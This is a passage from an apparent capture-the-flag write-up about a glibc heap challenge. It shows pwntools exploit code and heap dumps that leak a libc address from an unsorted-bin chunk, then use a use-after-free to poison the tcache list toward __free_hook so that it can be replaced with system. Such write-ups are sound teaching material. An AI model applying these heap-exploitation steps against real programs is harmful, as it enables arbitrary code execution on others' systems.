<li>1 chunk inside tcache[0x20] (<code>added street</code>)</li>
<li>1 chunk inside tcache[0x30] (<code>edited street</code>)</li>
<li>1 chunk inside tcache[0x50] (<code>property</code>)</li>
</ul>
<p>Below is the current heap and bins:</p>
<div class="highlight"><div class="chroma">
<table class="lntable"><tr><td class="lntd">
<pre tabindex="0" class="chroma"><code><span class="lnt"> 1
</span><span class="lnt"> 2
</span><span class="lnt"> 3
</span><span class="lnt"> 4
</span><span class="lnt"> 5
</span><span class="lnt"> 6
</span><span class="lnt"> 7
</span><span class="lnt"> 8
</span><span class="lnt"> 9
</span><span class="lnt">10
</span><span class="lnt">11
</span><span class="lnt">12
</span><span class="lnt">13
</span><span class="lnt">14
</span><span class="lnt">15
</span><span class="lnt">16
</span><span class="lnt">17
</span><span class="lnt">18
</span><span class="lnt">19
</span><span class="lnt">20
</span><span class="lnt">21
</span><span class="lnt">22
</span></code></pre></td>
<td class="lntd">
<pre tabindex="0" class="chroma"><code class="language-fallback" data-lang="fallback"><span class="line"><span class="cl">0x55802d04d290	0x0000000000000000	0x0000000000000081
</span></span><span class="line"><span class="cl">0x55802d04d2a0	0x00000000deadbeef	0x000000000000000a
</span></span><span class="line"><span class="cl">0x55802d04d2b0	0x0000000000000000	0x0000000000000000
</span></span><span class="line"><span class="cl">0x55802d04d2c0	0x0000000000000000	0x0000000000000000
</span></span><span class="line"><span class="cl">0x55802d04d2d0	0x0000000000000000	0x0000000000000000
</span></span><span class="line"><span class="cl">0x55802d04d2e0	0x0000000000000000	0x0000000000000000
</span></span><span class="line"><span class="cl">0x55802d04d2f0	0x0000000000000000	0x0000000000000000
</span></span><span class="line"><span class="cl">0x55802d04d300	0x0000000000000000	0x0000000000000000
</span></span><span class="line"><span class="cl">0x55802d04d310	0x0000000000000000	0x0000000000000051
</span></span><span class="line"><span class="cl">0x55802d04d320	0x0000000000000000	0x000055802d04d010	 &lt;-- tcachebins[0x50][0/1]
</span></span><span class="line"><span class="cl">0x55802d04d330	0x4024000000000000	0x000000000000000a
</span></span><span class="line"><span class="cl">0x55802d04d340	0x0000000000000000	0x0000000000000020
</span></span><span class="line"><span class="cl">0x55802d04d350	0x000055802d04d390	0x0000000000000427
</span></span><span class="line"><span class="cl">0x55802d04d360	0x0000000000000000	0x0000000000000021
</span></span><span class="line"><span class="cl">0x55802d04d370	0x0000000000000000	0x000055802d04d010	 &lt;-- tcachebins[0x20][0/1]
</span></span><span class="line"><span class="cl">0x55802d04d380	0x0000000000000000	0x0000000000000431	 &lt;-- unsortedbin[all][0]
</span></span><span class="line"><span class="cl">0x55802d04d390	0x00007fe1975bfbe0	0x00007fe1975bfbe0
</span></span><span class="line"><span class="cl">...
</span></span><span class="line"><span class="cl">0x55802d04d7b0	0x0000000000000430	0x0000000000000030
</span></span><span class="line"><span class="cl">0x55802d04d7c0	0x0000000000000000	0x000055802d04d010	 &lt;-- tcachebins[0x30][0/1]
</span></span><span class="line"><span class="cl">0x55802d04d7d0	0x0000000000000000	0x0000000000000000
</span></span><span class="line"><span class="cl">0x55802d04d7e0	0x0000000000000000	0x0000000000020821	 &lt;-- Top chunk
</span></span></code></pre></td></tr></table>
</div>
</div><p>It&rsquo;s time to leak the libc address.</p>
<div class="highlight"><div class="chroma">
<table class="lntable"><tr><td class="lntd">
<pre tabindex="0" class="chroma"><code><span class="lnt"> 1
</span><span class="lnt"> 2
</span><span class="lnt"> 3
</span><span class="lnt"> 4
</span><span class="lnt"> 5
</span><span class="lnt"> 6
</span><span class="lnt"> 7
</span><span class="lnt"> 8
</span><span class="lnt"> 9
</span><span class="lnt">10
</span></code></pre></td>
<td class="lntd">
<pre tabindex="0" class="chroma"><code class="language-python" data-lang="python"><span class="line"><span class="cl"><span class="n">add_property</span><span class="p">(</span><span class="n">r</span><span class="p">,</span> <span class="mh">0x10</span><span class="p">,</span> <span class="sa">b</span><span class="s1">&#39;lmao&#39;</span><span class="p">,</span> <span class="mi">0</span><span class="p">)</span>
</span></span><span class="line"><span class="cl"><span class="n">leaked_libc</span> <span class="o">=</span> <span class="n">u64</span><span class="p">(</span><span class="n">show_property</span><span class="p">(</span><span class="n">r</span><span class="p">)</span><span class="o">.</span><span class="n">ljust</span><span class="p">(</span><span class="mi">8</span><span class="p">,</span> <span class="sa">b</span><span class="s1">&#39;</span><span class="se">\x00</span><span class="s1">&#39;</span><span class="p">))</span>
</span></span><span class="line"><span class="cl"><span class="n">log</span><span class="o">.</span><span class="n">info</span><span class="p">(</span><span class="sa">f</span><span class="s1">&#39;leaked_libc: </span><span class="si">{</span><span class="nb">hex</span><span class="p">(</span><span class="n">leaked_libc</span><span class="p">)</span><span class="si">}</span><span class="s1">&#39;</span><span class="p">)</span>
</span></span><span class="line"><span class="cl"><span class="n">libc_base</span> <span class="o">=</span> <span class="n">leaked_libc</span> <span class="o">-</span> <span class="n">main_arena</span> <span class="o">-</span> <span class="mh">0x60</span>
</span></span><span class="line"><span class="cl"><span class="n">log</span><span class="o">.</span><span class="n">info</span><span class="p">(</span><span class="sa">f</span><span class="s1">&#39;libc_base: </span><span class="si">{</span><span class="nb">hex</span><span class="p">(</span><span class="n">libc_base</span><span class="p">)</span><span class="si">}</span><span class="s1">&#39;</span><span class="p">)</span>
</span></span><span class="line"><span class="cl"><span class="n">libc</span><span class="o">.</span><span class="n">address</span> <span class="o">=</span> <span class="n">libc_base</span>
</span></span><span class="line"><span class="cl"><span class="n">free_hook</span> <span class="o">=</span> <span class="n">libc</span><span class="o">.</span><span class="n">symbols</span><span class="p">[</span><span class="s1">&#39;__free_hook&#39;</span><span class="p">]</span>
</span></span><span class="line"><span class="cl"><span class="n">system</span> <span class="o">=</span> <span class="n">libc</span><span class="o">.</span><span class="n">symbols</span><span class="p">[</span><span class="s1">&#39;system&#39;</span><span class="p">]</span>
</span></span><span class="line"><span class="cl"><span class="n">log</span><span class="o">.</span><span class="n">info</span><span class="p">(</span><span class="sa">f</span><span class="s1">&#39;__free_hook@libc: </span><span class="si">{</span><span class="nb">hex</span><span class="p">(</span><span class="n">free_hook</span><span class="p">)</span><span class="si">}</span><span class="s1">&#39;</span><span class="p">)</span>
</span></span><span class="line"><span class="cl"><span class="n">log</span><span class="o">.</span><span class="n">info</span><span class="p">(</span><span class="sa">f</span><span class="s1">&#39;system@libc: </span><span class="si">{</span><span class="nb">hex</span><span class="p">(</span><span class="n">system</span><span class="p">)</span><span class="si">}</span><span class="s1">&#39;</span><span class="p">)</span>
</span></span></code></pre></td></tr></table>
</div>
</div><p>We simply create a new property without comment, and call <code>show_property</code>. I use <code>0x10</code> for the street size in order to make sure that the <code>malloc</code> call is used the available tcache (tcache[0x20]) instead of consuming our unsorted bin chunk. See below heap after we add the new property:</p>
<div class="highlight"><div class="chroma">
<table class="lntable"><tr><td class="lntd">
<pre tabindex="0" class="chroma"><code><span class="lnt"> 1
</span><span class="lnt"> 2
</span><span class="lnt"> 3
</span><span class="lnt"> 4
</span><span class="lnt"> 5
</span><span class="lnt"> 6
</span><span class="lnt"> 7
</span><span class="lnt"> 8
</span><span class="lnt"> 9
</span><span class="lnt">10
</span><span class="lnt">11
</span><span class="lnt">12
</span><span class="lnt">13
</span><span class="lnt">14
</span></code></pre></td>
<td class="lntd">
<pre tabindex="0" class="chroma"><code class="language-fallback" data-lang="fallback"><span class="line"><span class="cl">0x55802d04d310	0x0000000000000000	0x0000000000000051
</span></span><span class="line"><span class="cl">0x55802d04d320	0x0000000000000000	0x0000000000000000
</span></span><span class="line"><span class="cl">0x55802d04d330	0x4024000000000000	0x000000000000000a
</span></span><span class="line"><span class="cl">0x55802d04d340	0x000055802d04d370	0x0000000000000010
</span></span><span class="line"><span class="cl">0x55802d04d350	0x000055802d04d390	0x0000000000000427
</span></span><span class="line"><span class="cl">0x55802d04d360	0x0000000000000000	0x0000000000000021
</span></span><span class="line"><span class="cl">0x55802d04d370	0x000000006f616d6c	0x0000000000000000
</span></span><span class="line"><span class="cl">0x55802d04d380	0x0000000000000000	0x0000000000000431	 &lt;-- unsortedbin[all][0]
</span></span><span class="line"><span class="cl">0x55802d04d390	0x00007fe1975bfbe0	0x00007fe1975bfbe0
</span></span><span class="line"><span class="cl">... &lt;-- comment is pointing to this
</span></span><span class="line"><span class="cl">0x55802d04d7b0	0x0000000000000430	0x0000000000000030
</span></span><span class="line"><span class="cl">0x55802d04d7c0	0x0000000000000000	0x000055802d04d010	 &lt;-- tcachebins[0x30][0/1]
</span></span><span class="line"><span class="cl">0x55802d04d7d0	0x0000000000000000	0x0000000000000000
</span></span><span class="line"><span class="cl">0x55802d04d7e0	0x0000000000000000	0x0000000000020821	 &lt;-- Top chunk
</span></span></code></pre></td></tr></table>
</div>
</div><p>You can see that comment is pointing to <code>0x55802d04d390</code>, and then because comment is now a freed chunk inside unsorted bin, and its point to the libc <code>main_arena+0x60</code>, we will be able to retrieve the libc address of the current program.</p>
<h4 id="part-2-overwrite-__free_hook">Part 2: Overwrite <code>__free_hook</code></h4>
<p>Moving on to the next step, we will try to overwrite the <code>__free_hook</code> with <code>system</code>. We need to clean up our <code>property</code> first. To prevent double free happen during <code>remove_property</code>, we need to make the <code>comment</code> object is not a freed chunk. I use <code>change_username</code> to fill up the <code>comment</code> object.</p>
<div class="highlight"><div class="chroma">
<table class="lntable"><tr><td class="lntd">
<pre tabindex="0" class="chroma"><code><span class="lnt">1
</span><span class="lnt">2
</span></code></pre></td>
<td class="lntd">
<pre tabindex="0" class="chroma"><code class="language-fallback" data-lang="fallback"><span class="line"><span class="cl">change_username(r, 0x427, b&#39;lmao&#39;)
</span></span><span class="line"><span class="cl">remove_property(r)
</span></span></code></pre></td></tr></table>
</div>
</div><p>Basically, now the <code>username</code> object and the <code>comment</code> object points to the same address. This is very good for us, because both of them are now pointing to the same freed chunk of unsorted bin.
Remember that, if we call <code>change_username</code> with smaller <strong>STORED</strong> size (which is 0x427+1 in this case), the method will directly replace the values without doing <code>free</code> &amp; <code>malloc</code>. Due to how the glibc works, now, if we try to allocate chunk with rules:</p>
<ul>
<li>Size is smaller than unsorted bin</li>
<li>No available tcache with the desired allocated size</li>
</ul>
<p>It will used the unsorted bin by allocating it in the top of the unsorted bin chunk, and reduce its size. See below illustration</p>
<div class="highlight"><div class="chroma">
<table class="lntable"><tr><td class="lntd">
<pre tabindex="0" class="chroma"><code><span class="lnt"> 1
</span><span class="lnt"> 2
</span><span class="lnt"> 3
</span><span class="lnt"> 4
</span><span class="lnt"> 5
</span><span class="lnt"> 6
</span><span class="lnt"> 7
</span><span class="lnt"> 8
</span><span class="lnt"> 9
</span><span class="lnt">10
</span><span class="lnt">11
</span><span class="lnt">12
</span><span class="lnt">13
</span><span class="lnt">14
</span><span class="lnt">15
</span><span class="lnt">16
</span><span class="lnt">17
</span></code></pre></td>
<td class="lntd">
<pre tabindex="0" class="chroma"><code class="language-fallback" data-lang="fallback"><span class="line"><span class="cl">Let say we have heap like below
</span></span><span class="line"><span class="cl">0x557b64aef380 0x0000000000000000 0x0000000000000431 &lt;-- unsortedbin[all][0]
</span></span><span class="line"><span class="cl">0x557b64aef390 0x0000000000000000 0x0000000000000000
</span></span><span class="line"><span class="cl">0x557b64aef3a0 0x0000000000000000 0x0000000000000000
</span></span><span class="line"><span class="cl">0x557b64aef3b0 0x0000000000000000 0x0000000000000000
</span></span><span class="line"><span class="cl">0x557b64aef3c0 0x0000000000000000 0x0000000000000000
</span></span><span class="line"><span class="cl">0x557b64aef3d0 0x0000000000000000 0x0000000000000000
</span></span><span class="line"><span class="cl">...
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl">If tcache[0x20] is empty, and we want to allocate 0x20 chunk, it will use the top chunk of the unsorted bin.
</span></span><span class="line"><span class="cl">0x557b64aef380 0x0000000000000000 0x0000000000000021 &lt;-- new allocated chunk
</span></span><span class="line"><span class="cl">0x557b64aef390 0x0000000000000000 0x0000000000000000
</span></span><span class="line"><span class="cl">0x557b64aef3a0 0x0000000000000000 0x0000000000000411 &lt;-- unsortedbin[all][0]
</span></span><span class="line"><span class="cl">0x557b64aef3b0 0x0000000000000000 0x0000000000000000
</span></span><span class="line"><span class="cl">0x557b64aef3c0 0x0000000000000000 0x0000000000000000
</span></span><span class="line"><span class="cl">0x557b64aef3d0 0x0000000000000000 0x0000000000000000
</span></span><span class="line"><span class="cl">...
</span></span></code></pre></td></tr></table>
</div>
</div><p>Now, we know that <code>username</code> address is actually pointing to the top of the old unsorted bin chunk (0x431 size), and then after lot of allocations, the <code>username</code> will still points to the same address. And the stored <code>username</code> size is still the same (0x427+1).
Due to the fact that <code>change_username</code> method allow us to directly replace the value if the given size is smaller than the <code>stored</code> size, we are basically able to forge the chunk metadata which allocated between <code>username_address</code> and <code>username_address + 0x427</code></p>
<p>Now, let&rsquo;s try to implement that</p>
<div class="highlight"><div class="chroma">
<table class="lntable"><tr><td class="lntd">
<pre tabindex="0" class="chroma"><code><span class="lnt">1
</span><span class="lnt">2
</span></code></pre></td>
<td class="lntd">
<pre tabindex="0" class="chroma"><code class="language-python" data-lang="python"><span class="line"><span class="cl"><span class="n">add_property</span><span class="p">(</span><span class="n">r</span><span class="p">,</span> <span class="mh">0x89</span><span class="p">,</span> <span class="sa">b</span><span class="s1">&#39;lmao&#39;</span><span class="p">,</span> <span class="mh">0x20</span><span class="p">,</span> <span class="sa">b</span><span class="s1">&#39;lmao&#39;</span><span class="p">)</span>
</span></span><span class="line"><span class="cl"><span class="n">remove_property</span><span class="p">(</span><span class="n">r</span><span class="p">)</span>
</span></span></code></pre></td></tr></table>
</div>
</div><p>After those code, <code>username</code> and <code>comment</code> won&rsquo;t point to the same. Current heap state:</p>
<div class="highlight"><div class="chroma">
<table class="lntable"><tr><td class="lntd">
<pre tabindex="0" class="chroma"><code><span class="lnt"> 1
</span><span class="lnt"> 2
</span><span class="lnt"> 3
</span><span class="lnt"> 4
</span><span class="lnt"> 5
</span><span class="lnt"> 6
</span><span class="lnt"> 7
</span><span class="lnt"> 8
</span><span class="lnt"> 9
</span><span class="lnt">10
</span><span class="lnt">11
</span><span class="lnt">12
</span><span class="lnt">13
</span><span class="lnt">14
</span><span class="lnt">15
</span><span class="lnt">16
</span><span class="lnt">17
</span><span class="lnt">18
</span><span class="lnt">19
</span><span class="lnt">20
</span><span class="lnt">21
</span><span class="lnt">22
</span><span class="lnt">23
</span><span class="lnt">24
</span></code></pre></td>
<td class="lntd">
<pre tabindex="0" class="chroma"><code class="language-fallback" data-lang="fallback"><span class="line"><span class="cl">0x55802d04d310	0x0000000000000000	0x0000000000000051   &lt;-- property
</span></span><span class="line"><span class="cl">0x55802d04d320	0x0000000000000000	0x000055802d04d010	 &lt;-- tcachebins[0x50][0/1]
</span></span><span class="line"><span class="cl">0x55802d04d330	0x4024000000000000	0x000000000000000a
</span></span><span class="line"><span class="cl">0x55802d04d340	0x0000000000000000	0x0000000000000089
</span></span><span class="line"><span class="cl">0x55802d04d350	0x000055802d04d7c0	0x0000000000000020
</span></span><span class="line"><span class="cl">0x55802d04d360	0x0000000000000000	0x0000000000000021
</span></span><span class="line"><span class="cl">0x55802d04d370	0x0000000000000000	0x000055802d04d010	 &lt;-- tcachebins[0x20][0/1]
</span></span><span class="line"><span class="cl">0x55802d04d380	0x0000000000000000	0x00000000000000a1
</span></span><span class="line"><span class="cl">0x55802d04d390	0x0000000000000000	0x000055802d04d010	 &lt;-- tcachebins[0xa0][0/1], username
</span></span><span class="line"><span class="cl">0x55802d04d3a0	0x000055802d04d380	0x000055802d04d380
</span></span><span class="line"><span class="cl">0x55802d04d3b0	0x0000000000000000	0x0000000000000000
</span></span><span class="line"><span class="cl">0x55802d04d3c0	0x0000000000000000	0x0000000000000000
</span></span><span class="line"><span class="cl">0x55802d04d3d0	0x0000000000000000	0x0000000000000000
</span></span><span class="line"><span class="cl">0x55802d04d3e0	0x0000000000000000	0x0000000000000000
</span></span><span class="line"><span class="cl">0x55802d04d3f0	0x0000000000000000	0x0000000000000000
</span></span><span class="line"><span class="cl">0x55802d04d400	0x0000000000000000	0x0000000000000000
</span></span><span class="line"><span class="cl">0x55802d04d410	0x0000000000000000	0x0000000000000000
</span></span><span class="line"><span class="cl">0x55802d04d420	0x0000000000000000	0x0000000000000391	 &lt;-- unsortedbin[all][0]
</span></span><span class="line"><span class="cl">0x55802d04d430	0x00007fe1975bfbe0	0x00007fe1975bfbe0
</span></span><span class="line"><span class="cl">...
</span></span><span class="line"><span class="cl">0x55802d04d7b0	0x0000000000000390	0x0000000000000030
</span></span><span class="line"><span class="cl">0x55802d04d7c0	0x0000000000000000	0x000055802d04d010	 &lt;-- tcachebins[0x30][0/1], comment
</span></span><span class="line"><span class="cl">0x55802d04d7d0	0x0000000000000000	0x0000000000000000
</span></span><span class="line"><span class="cl">0x55802d04d7e0	0x0000000000000000	0x0000000000020821	 &lt;-- Top chunk
</span></span></code></pre></td></tr></table>
</div>
</div><p>Notes that <code>username</code> still points to <code>0x55802d04d390</code>, and now <code>comment</code> points to <code>0x55802d04d7c0</code>.</p>
<p>Notice that due to the freed <code>comment</code> chunk is not nulled by <code>remove_property</code>, not only we can leak the freed chunk content, we can also overwrite it via <code>edit_property</code>.</p>
<p>So we plan to overwrite the <code>__free_hook</code> via <code>edit_property</code> on the <code>comment</code>. I plan to forge tcache[0x60] linked list (because we don&rsquo;t have any tcache[0x60] yet, so when we allocate it, it will still consume our unsorted bin chunk), to point it to the <code>__free_hook</code>. Let&rsquo;s try to do that.</p>
<div class="highlight"><div class="chroma">
<table class="lntable"><tr><td class="lntd">
<pre tabindex="0" class="chroma"><code><span class="lnt">1
</span><span class="lnt">2
</span><span class="lnt">3
</span></code></pre></td>
<td class="lntd">
<pre tabindex="0" class="chroma"><code class="language-python" data-lang="python"><span class="line"><span class="cl"><span class="n">add_property</span><span class="p">(</span><span class="n">r</span><span class="p">,</span> <span class="mh">0x49</span><span class="p">,</span> <span class="sa">b</span><span class="s1">&#39;lmao&#39;</span><span class="p">,</span> <span class="mh">0x49</span><span class="p">,</span> <span class="sa">b</span><span class="s1">&#39;lmao&#39;</span><span class="p">)</span>
</span></span><span class="line"><span class="cl"><span class="n">edit_property</span><span class="p">(</span><span class="n">r</span><span class="p">,</span> <span class="mh">0x59</span><span class="p">,</span> <span class="sa">b</span><span class="s1">&#39;lmao&#39;</span><span class="p">,</span> <span class="mi">0</span><span class="p">)</span>
</span></span><span class="line"><span class="cl"><span class="n">remove_property</span><span class="p">(</span><span class="n">r</span><span class="p">)</span>
</span></span></code></pre></td></tr></table>
</div>
</div><p>Basically, what we do here is we try to allocate two chunk with 0x60 size (<code>street</code> and <code>comment</code>). We want our <code>comment</code> chunk got freed in the last due to the fact that tcache is LIFO (Last-In-First-Out). So, in order to do that, use <code>edit_property</code> to free the <code>street</code> 0x60 chunk, and then call <code>remove_property</code> to free the <code>comment</code> 0x60 chunk. Current heap state:</p>
<div class="highlight"><div class="chroma">
<table class="lntable"><tr><td class="lntd">
<pre tabindex="0" class="chroma"><code><span class="lnt"> 1
</span><span class="lnt"> 2
</span><span class="lnt"> 3
</span><span class="lnt"> 4
</span><span class="lnt"> 5
</span><span class="lnt"> 6
</span><span class="lnt"> 7
</span><span class="lnt"> 8
</span><span class="lnt"> 9
</span><span class="lnt">10
</span><span class="lnt">11
</span><span class="lnt">12
</span><span class="lnt">13
</span><span class="lnt">14
</span><span class="lnt">15
</span><span class="lnt">16
</span><span class="lnt">17
</span><span class="lnt">18
</span><span class="lnt">19
</span><span class="lnt">20
</span><span class="lnt">21
</span><span class="lnt">22
</span><span class="lnt">23
</span><span class="lnt">24
</span><span class="lnt">25
</span><span class="lnt">26
</span><span class="lnt">27
</span><span class="lnt">28
</span><span class="lnt">29
</span><span class="lnt">30
</span><span class="lnt">31
</span><span class="lnt">32
</span><span class="lnt">33
</span><span class="lnt">34
</span><span class="lnt">35
</span><span class="lnt">36
</span><span class="lnt">37
</span><span class="lnt">38
</span><span class="lnt">39
</span><span class="lnt">40
</span><span class="lnt">41
</span><span class="lnt">42
</span><span class="lnt">43
</span></code></pre></td>
<td class="lntd">
<pre tabindex="0" class="chroma"><code class="language-fallback" data-lang="fallback"><span class="line"><span class="cl">0x55802d04d310	0x0000000000000000	0x0000000000000051
</span></span><span class="line"><span class="cl">0x55802d04d320	0x0000000000000000	0x000055802d04d010	 &lt;-- tcachebins[0x50][0/1]
</span></span><span class="line"><span class="cl">0x55802d04d330	0x4024000000000000	0x000000000000000a
</span></span><span class="line"><span class="cl">0x55802d04d340	0x0000000000000000	0x0000000000000059
</span></span><span class="line"><span class="cl">0x55802d04d350	0x000055802d04d490	0x0000000000000049
</span></span><span class="line"><span class="cl">0x55802d04d360	0x0000000000000000	0x0000000000000021
</span></span><span class="line"><span class="cl">0x55802d04d370	0x0000000000000000	0x000055802d04d010	 &lt;-- tcachebins[0x20][0/1]
</span></span><span class="line"><span class="cl">0x55802d04d380	0x0000000000000000	0x00000000000000a1
</span></span><span class="line"><span class="cl">0x55802d04d390	0x0000000000000000	0x000055802d04d010	 &lt;-- tcachebins[0xa0][0/1]
</span></span><span class="line"><span class="cl">0x55802d04d3a0	0x000055802d04d380	0x000055802d04d380
</span></span><span class="line"><span class="cl">0x55802d04d3b0	0x0000000000000000	0x0000000000000000
</span></span><span class="line"><span class="cl">0x55802d04d3c0	0x0000000000000000	0x0000000000000000
</span></span><span class="line"><span class="cl">0x55802d04d3d0	0x0000000000000000	0x0000000000000000
</span></span><span class="line"><span class="cl">0x55802d04d3e0	0x0000000000000000	0x0000000000000000
</span></span><span class="line"><span class="cl">0x55802d04d3f0	0x0000000000000000	0x0000000000000000
</span></span><span class="line"><span class="cl">0x55802d04d400	0x0000000000000000	0x0000000000000000
</span></span><span class="line"><span class="cl">0x55802d04d410	0x0000000000000000	0x0000000000000000
</span></span><span class="line"><span class="cl">0x55802d04d420	0x0000000000000000	0x0000000000000061
</span></span><span class="line"><span class="cl">0x55802d04d430	0x0000000000000000	0x000055802d04d010	 &lt;-- tcachebins[0x60][1/2]
</span></span><span class="line"><span class="cl">0x55802d04d440	0x0000000000000000	0x0000000000000000
</span></span><span class="line"><span class="cl">0x55802d04d450	0x0000000000000000	0x0000000000000000
</span></span><span class="line"><span class="cl">0x55802d04d460	0x0000000000000000	0x0000000000000000
</span></span><span class="line"><span class="cl">0x55802d04d470	0x0000000000000000	0x0000000000000000
</span></span><span class="line"><span class="cl">0x55802d04d480	0x0000000000000000	0x0000000000000061
</span></span><span class="line"><span class="cl">0x55802d04d490	0x000055802d04d430	0x000055802d04d010	 &lt;-- tcachebins[0x60][0/2]
</span></span><span class="line"><span class="cl">0x55802d04d4a0	0x0000000000000000	0x0000000000000000
</span></span><span class="line"><span class="cl">0x55802d04d4b0	0x0000000000000000	0x0000000000000000
</span></span><span class="line"><span class="cl">0x55802d04d4c0	0x0000000000000000	0x0000000000000000
</span></span><span class="line"><span class="cl">0x55802d04d4d0	0x0000000000000000	0x0000000000000000
</span></span><span class="line"><span class="cl">0x55802d04d4e0	0x0000000000000000	0x0000000000000071
</span></span><span class="line"><span class="cl">0x55802d04d4f0	0x0000000000000000	0x000055802d04d010	 &lt;-- tcachebins[0x70][0/1]
</span></span><span class="line"><span class="cl">0x55802d04d500	0x0000000000000000	0x0000000000000000
</span></span><span class="line"><span class="cl">0x55802d04d510	0x0000000000000000	0x0000000000000000
</span></span><span class="line"><span class="cl">0x55802d04d520	0x0000000000000000	0x0000000000000000
</span></span><span class="line"><span class="cl">0x55802d04d530	0x0000000000000000	0x0000000000000000
</span></span><span class="line"><span class="cl">0x55802d04d540	0x0000000000000000	0x0000000000000000
</span></span><span class="line"><span class="cl">0x55802d04d550	0x0000000000000000	0x0000000000000261	 &lt;-- unsortedbin[all][0]
</span></span><span class="line"><span class="cl">0x55802d04d560	0x00007fe1975bfbe0	0x00007fe1975bfbe0
</span></span><span class="line"><span class="cl">...
</span></span><span class="line"><span class="cl">0x55802d04d7b0	0x0000000000000260	0x0000000000000030
</span></span><span class="line"><span class="cl">0x55802d04d7c0	0x0000000000000000	0x000055802d04d010	 &lt;-- tcachebins[0x30][0/1]
</span></span><span class="line"><span class="cl">0x55802d04d7d0	0x0000000000000000	0x0000000000000000
</span></span><span class="line"><span class="cl">0x55802d04d7e0	0x0000000000000000	0x0000000000020821	 &lt;-- Top chunk
</span></span></code></pre></td></tr></table>
</div>
</div><p>Notice that our <code>comment</code> will determine the next tcache[0x60] pointer. Current bins:</p>
<div class="highlight"><div class="chroma">
<table class="lntable"><tr><td class="lntd">
<pre tabindex="0" class="chroma"><code><span class="lnt">1
</span><span class="lnt">2
</span></code></pre></td>
<td class="lntd">
<pre tabindex="0" class="chroma"><code class="language-fallback" data-lang="fallback"><span class="line"><span class="cl">tcachebins
</span></span><span class="line"><span class="cl">0x60 [  2]: 0x55802d04d490 ‚Äî‚ñ∏ 0x55802d04d430 ‚óÇ‚Äî 0x0
</span></span></code></pre></td></tr></table>
</div>
</div><p>It&rsquo;s time to forge the tcache[0x60] linked list</p>
<div class="highlight"><div class="chroma">
<table class="lntable"><tr><td class="lntd">
<pre tabindex="0" class="chroma"><code><span class="lnt">1
</span><span class="lnt">2
</span></code></pre></td>
<td class="lntd">
<pre tabindex="0" class="chroma"><code class="language-python" data-lang="python"><span class="line"><span class="cl"><span class="n">add_property</span><span class="p">(</span><span class="n">r</span><span class="p">,</span> <span class="mh">0x20</span><span class="p">,</span> <span class="sa">b</span><span class="s1">&#39;lmao&#39;</span><span class="p">,</span> <span class="mi">0</span><span class="p">)</span>
</span></span><span class="line"><span class="cl"><span class="n">edit_property</span><span class="p">(</span><span class="n">r</span><span class="p">,</span> <span class="mi">0</span><span class="p">,</span> <span class="sa">b</span><span class="s1">&#39;lmao&#39;</span><span class="p">,</span> <span class="mh">0x20</span><span class="p">,</span> <span class="n">p64</span><span class="p">(</span><span class="n">free_hook</span><span class="p">),</span> <span class="kc">True</span><span class="p">)</span>
</span></span></code></pre></td></tr></table>
</div>
</div><p>What we do here is create a new property without comment, and then overwrite the value with the <code>__free_hook</code> address. Assign smaller size than the stored size of comment (0x49) to make sure that the <code>edit_property</code> directly edit the <code>comment</code> value. Now, the bins will be like below:</p>
<div class="highlight"><div class="chroma">
<table class="lntable"><tr><td class="lntd">
<pre tabindex="0" class="chroma"><code><span class="lnt">1
</span><span class="lnt">2
</span></code></pre></td>
<td class="lntd">
<pre tabindex="0" class="chroma"><code class="language-fallback" data-lang="fallback"><span class="line"><span class="cl">tcachebins
</span></span><span class="line"><span class="cl">0x60 [  2]: 0x55802d04d490 ‚Äî‚ñ∏ 0x7fe1975c1e48 (__free_hook) ‚óÇ‚Äî 0x0
</span></span></code></pre></td></tr></table>
</div>
</div><p>Current heap:</p>
<div class="highlight"><div class="chroma">
<table class="lntable"><tr><td class="lntd">
<pre tabindex="0" class="chroma"><code><span class="lnt"> 1
</span><span class="lnt"> 2
</span><span class="lnt"> 3
</span><span class="lnt"> 4
</span><span class="lnt"> 5
</span><span class="lnt"> 6
</span><span class="lnt"> 7
</span><span class="lnt"> 8
</span><span class="lnt"> 9
</span><span class="lnt">10
</span><span class="lnt">11
</span><span class="lnt">12
</span><span class="lnt">13
</span><span class="lnt">14
</span><span class="lnt">15
</span><span class="lnt">16
</span><span class="lnt">17
</span><span class="lnt">18
</span><span class="lnt">19
</span><span class="lnt">20
</span><span class="lnt">21
</span><span class="lnt">22
</span><span class="lnt">23
</span><span class="lnt">24
</span><span class="lnt">25
</span><span class="lnt">26
</span><span class="lnt">27
</span><span class="lnt">28
</span><span class="lnt">29
</span><span class="lnt">30
</span><span class="lnt">31
</span><span class="lnt">32
</span><span class="lnt">33
</span><span class="lnt">34
</span><span class="lnt">35
</span><span class="lnt">36
</span><span class="lnt">37
</span><span class="lnt">38
</span><span class="lnt">39
</span><span class="lnt">40
</span><span class="lnt">41
</span><span class="lnt">42
</span><span class="lnt">43
</span></code></pre></td>
<td class="lntd">
<pre tabindex="0" class="chroma"><code class="language-fallback" data-lang="fallback"><span class="line"><span class="cl">0x55802d04d310	0x0000000000000000	0x0000000000000051
</span></span><span class="line"><span class="cl">0x55802d04d320	0x0000000000000000	0x0000000000000000
</span></span><span class="line"><span class="cl">0x55802d04d330	0x4024000000000000	0x000000000000000a
</span></span><span class="line"><span class="cl">0x55802d04d340	0x000055802d04d7c0	0x0000000000000020
</span></span><span class="line"><span class="cl">0x55802d04d350	0x000055802d04d490	0x0000000000000020
</span></span><span class="line"><span class="cl">0x55802d04d360	0x0000000000000000	0x0000000000000021
</span></span><span class="line"><span class="cl">0x55802d04d370	0x0000000000000000	0x000055802d04d010	 &lt;-- tcachebins[0x20][0/1]
</span></span><span class="line"><span class="cl">0x55802d04d380	0x0000000000000000	0x00000000000000a1
</span></span><span class="line"><span class="cl">0x55802d04d390	0x0000000000000000	0x000055802d04d010	 &lt;-- tcachebins[0xa0][0/1]
</span></span><span class="line"><span class="cl">0x55802d04d3a0	0x000055802d04d380	0x000055802d04d380
</span></span><span class="line"><span class="cl">0x55802d04d3b0	0x0000000000000000	0x0000000000000000
</span></span><span class="line"><span class="cl">0x55802d04d3c0	0x0000000000000000	0x0000000000000000
</span></span><span class="line"><span class="cl">0x55802d04d3d0	0x0000000000000000	0x0000000000000000
</span></span><span class="line"><span class="cl">0x55802d04d3e0	0x0000000000000000	0x0000000000000000
</span></span><span class="line"><span class="cl">0x55802d04d3f0	0x0000000000000000	0x0000000000000000
</span></span><span class="line"><span class="cl">0x55802d04d400	0x0000000000000000	0x0000000000000000
</span></span><span class="line"><span class="cl">0x55802d04d410	0x0000000000000000	0x0000000000000000
</span></span><span class="line"><span class="cl">0x55802d04d420	0x0000000000000000	0x0000000000000061
